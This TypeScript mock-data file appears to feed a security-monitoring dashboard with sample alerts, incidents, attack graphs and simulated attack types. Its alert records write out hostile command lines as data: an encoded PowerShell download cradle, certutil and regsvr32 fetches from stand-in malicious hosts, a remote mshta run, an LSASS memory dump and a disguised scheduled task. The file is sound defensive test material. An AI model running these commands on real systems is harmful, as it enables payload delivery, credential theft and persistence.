import type { Alert, Incident, DashboardStats, SimulationAttack } from '../types';

export const mockStats: DashboardStats = {
  activeAlerts: 14,
  openIncidents: 3,
  avgResponseTime: '1.8s',
  monitoredHosts: 124,
  mitreCoveragePercent: 42,
  riskLevel: 'HIGH',
};

export const mockAlerts: Alert[] = [
  {
    id: 'AL-2084',
    timestamp: '2026-07-15T18:24:12Z',
    rule_name: 'Suspicious Encoded PowerShell Execution',
    severity: 'CRITICAL',
    host: 'WIN-DEV-04',
    user: 'jdoe',
    process_name: 'powershell.exe',
    command_line: 'powershell.exe -nop -w hidden -enc JAB3AGMAYgAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdwBjAGIALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcAA6AC8ALwBtAGEAbAB3AGEAcgBlAC4AYwBvAG0ALwBwAGEAeQBsAG8AYQBkAC4AZQB4AGUAACkAOwA=',
    mitre_tactic: 'Execution',
    mitre_technique: 'Command and Scripting Interpreter: PowerShell (T1059.001)',
    status: 'OPEN',
    description: 'An encoded PowerShell command was executed, indicating potential obfuscation of malicious scripts.',
  },
  {
    id: 'AL-2083',
    timestamp: '2026-07-15T18:22:05Z',
    rule_name: 'LSASS Memory Dump via Procdump',
    severity: 'CRITICAL',
    host: 'WIN-AD-01',
    user: 'SYSTEM',
    process_name: 'procdump64.exe',
    command_line: 'procdump64.exe -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp',
    mitre_tactic: 'Credential Access',
    mitre_technique: 'OS Credential Dumping: LSASS Memory (T1003.001)',
    status: 'OPEN',
    description: 'Procdump utility was used to dump the memory of Local Security Authority Subsystem Service (LSASS) process to disk.',
  },
  {
    id: 'AL-2082',
    timestamp: '2026-07-15T18:15:30Z',
    rule_name: 'CertUtil External Connection and File Download',
    severity: 'HIGH',
    host: 'WIN-DEV-04',
    user: 'jdoe',
    process_name: 'certutil.exe',
    command_line: 'certutil.exe -urlcache -f http://evil-server.net/payload.exe payload.exe',
    mitre_tactic: 'Defense Evasion',
    mitre_technique: 'System Binary Proxy Execution: Certutil (T1218.014)',
    status: 'OPEN',
    description: 'Certutil was invoked to download a file from an external URL, which is a common defense evasion technique.',
  },
  {
    id: 'AL-2081',
    timestamp: '2026-07-15T18:02:44Z',
    rule_name: 'Regsvr32 Remote Scriptlet Execution',
    severity: 'HIGH',
    host: 'WIN-MKTG-03',
    user: 'msmith',
    process_name: 'regsvr32.exe',
    command_line: 'regsvr32.exe /s /n /u /i:http://badsite.com/sc.sct scrobj.dll',
    mitre_tactic: 'Defense Evasion',
    mitre_technique: 'System Binary Proxy Execution: Regsvr32 (T1218.010)',
    status: 'OPEN',
    description: 'Regsvr32 was executed with a remote scriptlet URL, which allows executing arbitrary DLLs or scriptlets bypassing application whitelisting.',
  },
  {
    id: 'AL-2080',
    timestamp: '2026-07-15T17:45:12Z',
    rule_name: 'Suspicious Scheduled Task Creation',
    severity: 'MEDIUM',
    host: 'WIN-DEV-04',
    user: 'jdoe',
    process_name: 'schtasks.exe',
    command_line: 'schtasks.exe /create /tn "OneDrive Update" /tr "C:\\Windows\\Temp\\payload.exe" /sc hourly',
    mitre_tactic: 'Persistence',
    mitre_technique: 'Scheduled Task/Job: Scheduled Task (T1053.005)',
    status: 'INVESTIGATING',
    description: 'A new scheduled task was created mimicking a common update process, pointing to a binary in the Temp directory.',
  },
  {
    id: 'AL-2079',
    timestamp: '2026-07-15T17:30:00Z',
    rule_name: 'WMIC Remote Command Invocation',
    severity: 'MEDIUM',
    host: 'WIN-HR-09',
    user: 'jdoe',
    process_name: 'wmic.exe',
    command_line: 'wmic.exe /node:"WIN-FIN-07" process call create "cmd.exe /c calc.exe"',
    mitre_tactic: 'Execution',
    mitre_technique: 'Windows Management Instrumentation (T1047)',
    status: 'RESOLVED',
    description: 'WMIC was used to spawn a process on a remote node, indicating lateral movement attempts.',
  },
  {
    id: 'AL-2078',
    timestamp: '2026-07-15T17:12:05Z',
    rule_name: 'Mshta Execution of Remote HTML Application',
    severity: 'HIGH',
    host: 'WIN-DEV-12',
    user: 'asmith',
    process_name: 'mshta.exe',
    command_line: 'mshta.exe http://192.168.1.50/malicious.hta',
    mitre_tactic: 'Defense Evasion',
    mitre_technique: 'System Binary Proxy Execution: Mshta (T1218.005)',
    status: 'OPEN',
    description: 'Mshta was used to run an HTML Application (HTA) from a remote server, which executes script outside of browser security controls.',
  },
  {
    id: 'AL-2077',
    timestamp: '2026-07-15T16:50:33Z',
    rule_name: 'RunDLL32 Spawned by Command Line',
    severity: 'LOW',
    host: 'WIN-FIN-07',
    user: 'jdoe',
    process_name: 'rundll32.exe',
    command_line: 'rundll32.exe shell32.dll,Control_RunDLL',
    mitre_tactic: 'Defense Evasion',
    mitre_technique: 'System Binary Proxy Execution: Rundll32 (T1218.011)',
    status: 'RESOLVED',
    description: 'RunDLL32 was used to execute a DLL, which is common but in this context triggered a minor alert due to parental context.',
  }
];

export const mockIncidents: Incident[] = [
  {
    id: 'INC-2026-001',
    title: 'Ransomware Kill Chain on WIN-DEV-04',
    status: 'OPEN',
    severity: 'CRITICAL',
    risk_score: 9.4,
    created_at: '2026-07-15T18:24:12Z',
    host: 'WIN-DEV-04',
    user: 'jdoe',
    alerts_count: 3,
    mitre_mapping: [
      { tactic: 'Execution', technique: 'PowerShell', id: 'T1059.001' },
      { tactic: 'Defense Evasion', technique: 'Certutil', id: 'T1218.014' },
      { tactic: 'Persistence', technique: 'Scheduled Task', id: 'T1053.005' }
    ],
    ai_summary: 'An active threat actor on WIN-DEV-04 has performed a classic ransomware staging sequence. The attack started with a user executing an Excel spreadsheet containing a malicious macro, triggering a series of encoded PowerShell commands. These commands utilized Certutil to download a malicious payload (`payload.exe`) from an untrusted external server. Finally, persistence was established by creating a masqueraded scheduled task named "OneDrive Update". The behavior aligns with pre-ransomware profiling, exhibiting staging and execution patterns.',
    recommendations: [
      'Isolate host WIN-DEV-04 from the corporate network immediately using the EDR playbook.',
      'Revoke active session tokens for user jdoe and force password reset.',
      'Capture host memory snapshot for malware analysis and locate the downloaded payload.exe in C:\\Windows\\Temp.',
      'Block outbound traffic to malicious domain evil-server.net at the boundary firewall.'
    ],
    confidence_score: 97,
    timeline: [
      {
        time: '2026-07-15T18:02:44Z',
        event: 'Scheduled Task Created',
        details: 'schtasks.exe created task "OneDrive Update" pointing to C:\\Windows\\Temp\\payload.exe',
        type: 'alert'
      },
      {
        time: '2026-07-15T18:15:30Z',
        event: 'File Downloaded via CertUtil',
        details: 'certutil.exe downloaded payload.exe from evil-server.net',
        type: 'alert'
      },
      {
        time: '2026-07-15T18:24:12Z',
        event: 'Encoded PowerShell Command Executed',
        details: 'Base64 encoded string decoded to an active download-and-execute memory cradle',
        type: 'alert'
      },
      {
        time: '2026-07-15T18:24:15Z',
        event: 'AI Threat Correlated',
        details: 'Ollama local LLM correlated alerts into INC-2026-001 with 9.4 severity risk',
        type: 'analysis'
      },
      {
        time: '2026-07-15T18:24:16Z',
        event: 'Automatic Playbook Initiated',
        details: 'EDR isolated WIN-DEV-04 and initiated account lockdown for jdoe',
        type: 'action'
      }
    ]
  },
  {
    id: 'INC-2026-002',
    title: 'Credential Harvesting Attempt on WIN-AD-01',
    status: 'OPEN',
    severity: 'CRITICAL',
    risk_score: 9.8,
    created_at: '2026-07-15T18:22:05Z',
    host: 'WIN-AD-01',
    user: 'SYSTEM',
    alerts_count: 1,
    mitre_mapping: [
      { tactic: 'Credential Access', technique: 'OS Credential Dumping: LSASS Memory', id: 'T1003.001' }
    ],
    ai_summary: 'An attempt to read and dump the memory of the Local Security Authority Subsystem Service (LSASS) was detected on Active Directory Domain Controller WIN-AD-01. The process was initiated by command-line using Sysinternals Procdump tool under high-privileged SYSTEM credentials. This indicates a high likelihood of credential theft targeting domain hashes.',
    recommendations: [
      'Conduct immediate investigation into how administrative access was obtained on WIN-AD-01.',
      'Scan system logs for lateral movement from other compromised hosts in the subnet.',
      'Validate integrity of active directories and change Krbtgt password twice.',
      'Check host for any signs of dump file exfiltration.'
    ],
    confidence_score: 99,
    timeline: [
      {
        time: '2026-07-15T18:22:05Z',
        event: 'LSASS Memory Dump Attempted',
        details: 'procdump64.exe targeted lsass.exe to output C:\\Windows\\Temp\\lsass.dmp',
        type: 'alert'
      },
      {
        time: '2026-07-15T18:22:10Z',
        event: 'Incident Escalation',
        details: 'Security engine detected dumping of AD Controller lsass process. High-priority critical alert generated.',
        type: 'analysis'
      }
    ]
  },
  {
    id: 'INC-2026-003',
    title: 'Regsvr32 Remote Execution on WIN-MKTG-03',
    status: 'OPEN',
    severity: 'HIGH',
    risk_score: 8.1,
    created_at: '2026-07-15T18:02:44Z',
    host: 'WIN-MKTG-03',
    user: 'msmith',
    alerts_count: 1,
    mitre_mapping: [
      { tactic: 'Defense Evasion', technique: 'System Binary Proxy Execution: Regsvr32', id: 'T1218.010' }
    ],
    ai_summary: 'Regsvr32 utility was executed with parameters to fetch and run a remote scriptlet from badsite.com. This allows an attacker to execute arbitrary code bypassing standard AppLocker and application whitelisting controls. The user msmith is a Marketing executive and has no business launching command-line system utilities.',
    recommendations: [
      'Isolate WIN-MKTG-03 immediately.',
      'Review proxy/DNS logs for traffic from WIN-MKTG-03 to badsite.com.',
      'Clean temporary Internet files on the endpoint and check for persistent registry keys.'
    ],
    confidence_score: 91,
    timeline: [
      {
        time: '2026-07-15T18:02:44Z',
        event: 'Regsvr32 scriptlet load detected',
        details: 'regsvr32.exe fetched sc.sct from badsite.com',
        type: 'alert'
      }
    ]
  }
];

// ─── Sprint 05: Investigation mock data ───

export const mockInvestigations: Record<string, unknown> = {
  'INC-2026-001': {
    incident_id: 'INC-2026-001',
    host: 'WIN-DEV-04',
    user: 'jdoe',
    title: 'Multi-stage Execution, Defense Evasion, Persistence on WIN-DEV-04 (jdoe)',
    attack_story: {
      title: 'Multi-stage Execution, Defense Evasion, Persistence on WIN-DEV-04 (jdoe)',
      stages: [
        {
          stage: 'Execution',
          alert_count: 1,
          alerts: [{ id: 'AL-2084', rule: 'Suspicious Encoded PowerShell Execution', severity: 'CRITICAL' }],
          actions: ['Review the executed command line arguments for obfuscation or encoded payloads.', 'Check parent process ancestry to determine how the binary was launched.'],
        },
        {
          stage: 'Defense Evasion',
          alert_count: 1,
          alerts: [{ id: 'AL-2082', rule: 'CertUtil External Connection and File Download', severity: 'HIGH' }],
          actions: ['Review AV/EDR logs for tampering or exclusion creation.', 'Check for renamed binaries or LOLBin usage in the process tree.'],
        },
        {
          stage: 'Persistence',
          alert_count: 1,
          alerts: [{ id: 'AL-2080', rule: 'Suspicious Scheduled Task Creation', severity: 'MEDIUM' }],
          actions: ['Audit scheduled tasks, services, and startup registry keys on the affected host.', 'Verify if the persistence mechanism has already triggered on other hosts.'],
        },
      ],
      narrative: 'Analysis of 3 correlated alerts reveals a 3-stage attack chain.\n\n**Execution:** Suspicious Encoded PowerShell Execution\n**Defense Evasion:** CertUtil External Connection and File Download\n**Persistence:** Suspicious Scheduled Task Creation\n\nThe alerts are related because they share common infrastructure\n(WIN-DEV-04, jdoe) and form a logical progression of the attack lifecycle.',
      next_steps: [
        'Review the executed command line arguments for obfuscation or encoded payloads.',
        'Check parent process ancestry to determine how the binary was launched.',
        'Review AV/EDR logs for tampering or exclusion creation.',
        'Check for renamed binaries or LOLBin usage in the process tree.',
        'Audit scheduled tasks, services, and startup registry keys on the affected host.',
        'Verify if the persistence mechanism has already triggered on other hosts.',
      ],
      techniques: ['T1059.001', 'T1218.014', 'T1053.005'],
      total_alerts: 3,
      kill_chain_coverage: '3/11 stages',
    },
    correlation: {
      correlations: [
        {
          alert_a: 'AL-2084', alert_b: 'AL-2082',
          rule_a: 'Suspicious Encoded PowerShell Execution', rule_b: 'CertUtil External Connection and File Download',
          correlation_score: 72,
          breakdown: ['same_host', 'same_user', 'temporal_proximity:522s'],
          host: 'WIN-DEV-04', user: 'jdoe',
        },
        {
          alert_a: 'AL-2084', alert_b: 'AL-2080',
          rule_a: 'Suspicious Encoded PowerShell Execution', rule_b: 'Suspicious Scheduled Task Creation',
          correlation_score: 68,
          breakdown: ['same_host', 'same_user', 'temporal_proximity:2340s'],
          host: 'WIN-DEV-04', user: 'jdoe',
        },
        {
          alert_a: 'AL-2082', alert_b: 'AL-2080',
          rule_a: 'CertUtil External Connection and File Download', rule_b: 'Suspicious Scheduled Task Creation',
          correlation_score: 45,
          breakdown: ['same_host', 'same_user'],
          host: 'WIN-DEV-04', user: 'jdoe',
        },
      ],
      global_score: 62,
      total_alerts: 3,
      total_clusters: 1,
    },
    graph: {
      nodes: [
        { id: 'host_WIN-DEV-04', label: 'WIN-DEV-04', type: 'host', severity: 'info' },
        { id: 'proc_powershell_exe', label: 'powershell.exe', type: 'process', severity: 'info' },
        { id: 'proc_certutil_exe', label: 'certutil.exe', type: 'process', severity: 'info' },
        { id: 'proc_schtasks_exe', label: 'schtasks.exe', type: 'process', severity: 'info' },
        { id: 'alert_AL-2084', label: 'Suspicious Encoded PowerShell Execution', type: 'alert', severity: 'CRITICAL', alert_id: 'AL-2084' },
        { id: 'alert_AL-2082', label: 'CertUtil External Connection and File Download', type: 'alert', severity: 'HIGH', alert_id: 'AL-2082' },
        { id: 'alert_AL-2080', label: 'Suspicious Scheduled Task Creation', type: 'alert', severity: 'MEDIUM', alert_id: 'AL-2080' },
        { id: 'mitre_T1059_001', label: 'T1059.001', type: 'mitre', severity: 'info' },
        { id: 'mitre_T1218_014', label: 'T1218.014', type: 'mitre', severity: 'info' },
        { id: 'mitre_T1053_005', label: 'T1053.005', type: 'mitre', severity: 'info' },
      ],
      edges: [
        { source: 'host_WIN-DEV-04', target: 'proc_powershell_exe', label: 'spawns', type: 'relation' },
        { source: 'host_WIN-DEV-04', target: 'proc_certutil_exe', label: 'spawns', type: 'relation' },
        { source: 'host_WIN-DEV-04', target: 'proc_schtasks_exe', label: 'spawns', type: 'relation' },
        { source: 'proc_powershell_exe', target: 'alert_AL-2084', label: 'triggers', type: 'detection' },
        { source: 'proc_certutil_exe', target: 'alert_AL-2082', label: 'triggers', type: 'detection' },
        { source: 'proc_schtasks_exe', target: 'alert_AL-2080', label: 'triggers', type: 'detection' },
        { source: 'alert_AL-2084', target: 'mitre_T1059_001', label: 'maps_to', type: 'mapping' },
        { source: 'alert_AL-2082', target: 'mitre_T1218_014', label: 'maps_to', type: 'mapping' },
        { source: 'alert_AL-2080', target: 'mitre_T1053_005', label: 'maps_to', type: 'mapping' },
      ],
    },
  },
  'INC-2026-002': {
    incident_id: 'INC-2026-002',
    host: 'WIN-AD-01',
    user: 'SYSTEM',
    title: 'Credential Access on WIN-AD-01 (SYSTEM)',
    attack_story: {
      title: 'Credential Access on WIN-AD-01 (SYSTEM)',
      stages: [
        {
          stage: 'Credential Access',
          alert_count: 1,
          alerts: [{ id: 'AL-2083', rule: 'LSASS Memory Dump via Procdump', severity: 'CRITICAL' }],
          actions: ['Immediately rotate credentials for the affected user and service accounts.', 'Scan memory dumps and credential stores on the impacted host.'],
        },
      ],
      narrative: 'Analysis of 1 correlated alert reveals a 1-stage attack chain.\n\n**Credential Access:** LSASS Memory Dump via Procdump\n\nThe alert is a standalone high-priority credential theft indicator on Domain Controller WIN-AD-01.',
      next_steps: ['Immediately rotate credentials for the affected user and service accounts.', 'Scan memory dumps and credential stores on the impacted host.'],
      techniques: ['T1003.001'],
      total_alerts: 1,
      kill_chain_coverage: '1/11 stages',
    },
    correlation: {
      correlations: [],
      global_score: 0,
      total_alerts: 1,
      total_clusters: 1,
    },
    graph: {
      nodes: [
        { id: 'host_WIN-AD-01', label: 'WIN-AD-01', type: 'host', severity: 'info' },
        { id: 'proc_procdump64_exe', label: 'procdump64.exe', type: 'process', severity: 'info' },
        { id: 'alert_AL-2083', label: 'LSASS Memory Dump via Procdump', type: 'alert', severity: 'CRITICAL', alert_id: 'AL-2083' },
        { id: 'mitre_T1003_001', label: 'T1003.001', type: 'mitre', severity: 'info' },
      ],
      edges: [
        { source: 'host_WIN-AD-01', target: 'proc_procdump64_exe', label: 'spawns', type: 'relation' },
        { source: 'proc_procdump64_exe', target: 'alert_AL-2083', label: 'triggers', type: 'detection' },
        { source: 'alert_AL-2083', target: 'mitre_T1003_001', label: 'maps_to', type: 'mapping' },
      ],
    },
  },
  'INC-2026-003': {
    incident_id: 'INC-2026-003',
    host: 'WIN-MKTG-03',
    user: 'msmith',
    title: 'Defense Evasion on WIN-MKTG-03 (msmith)',
    attack_story: {
      title: 'Defense Evasion on WIN-MKTG-03 (msmith)',
      stages: [
        {
          stage: 'Defense Evasion',
          alert_count: 1,
          alerts: [{ id: 'AL-2081', rule: 'Regsvr32 Remote Scriptlet Execution', severity: 'HIGH' }],
          actions: ['Review AV/EDR logs for tampering or exclusion creation.', 'Check for renamed binaries or LOLBin usage in the process tree.'],
        },
      ],
      narrative: 'Analysis of 1 correlated alert reveals a 1-stage attack chain.\n\n**Defense Evasion:** Regsvr32 Remote Scriptlet Execution\n\nThe alert indicates a LOLBin execution technique on a non-technical user workstation.',
      next_steps: ['Review AV/EDR logs for tampering or exclusion creation.', 'Check for renamed binaries or LOLBin usage in the process tree.'],
      techniques: ['T1218.010'],
      total_alerts: 1,
      kill_chain_coverage: '1/11 stages',
    },
    correlation: {
      correlations: [],
      global_score: 0,
      total_alerts: 1,
      total_clusters: 1,
    },
    graph: {
      nodes: [
        { id: 'host_WIN-MKTG-03', label: 'WIN-MKTG-03', type: 'host', severity: 'info' },
        { id: 'proc_regsvr32_exe', label: 'regsvr32.exe', type: 'process', severity: 'info' },
        { id: 'alert_AL-2081', label: 'Regsvr32 Remote Scriptlet Execution', type: 'alert', severity: 'HIGH', alert_id: 'AL-2081' },
        { id: 'mitre_T1218_010', label: 'T1218.010', type: 'mitre', severity: 'info' },
      ],
      edges: [
        { source: 'host_WIN-MKTG-03', target: 'proc_regsvr32_exe', label: 'spawns', type: 'relation' },
        { source: 'proc_regsvr32_exe', target: 'alert_AL-2081', label: 'triggers', type: 'detection' },
        { source: 'alert_AL-2081', target: 'mitre_T1218_010', label: 'maps_to', type: 'mapping' },
      ],
    },
  },
};

export const simulationAttacks: SimulationAttack[] = [
  {
    id: 'powershell',
    name: 'PowerShell Encoded Command',
    description: 'Triggers a Base64-encoded PowerShell script execution designed to download a mock payload.',
    tactic: 'Execution',
    technique: 'T1059.001'
  },
  {
    id: 'cmd',
    name: 'CMD Interactive Spawn',
    description: 'Launches cmd.exe as a child process of a non-standard utility (e.g. explorer.exe) to simulate local cmd interaction.',
    tactic: 'Execution',
    technique: 'T1059.003'
  },
  {
    id: 'certutil',
    name: 'CertUtil Remote File Copy',
    description: 'Uses certutil.exe to fetch a mock threat database payload from an external IP address.',
    tactic: 'Defense Evasion',
    technique: 'T1218.014'
  },
  {
    id: 'mshta',
    name: 'Mshta HTA Scriptlet Execution',
    description: 'Launches mshta.exe targeting a remote HTML application (HTA) script to execute code in RAM.',
    tactic: 'Defense Evasion',
    technique: 'T1218.005'
  },
  {
    id: 'rundll32',
    name: 'RunDLL32 Remote Dynamic Load',
    description: 'Calls rundll32.exe to execute a entry point of a mock DLL in standard directory.',
    tactic: 'Defense Evasion',
    technique: 'T1218.011'
  },
  {
    id: 'regsvr32',
    name: 'Regsvr32 Remote Scriptlet Load',
    description: 'Invokes regsvr32.exe pointing to a remote scriptlet (.sct file) bypassing execution block.',
    tactic: 'Defense Evasion',
    technique: 'T1218.010'
  },
  {
    id: 'wmic',
    name: 'WMIC Shadow Copy Delete',
    description: 'Simulates ransomware activity by calling wmic.exe shadowcopy delete command line.',
    tactic: 'Impact',
    technique: 'T1490'
  }
];
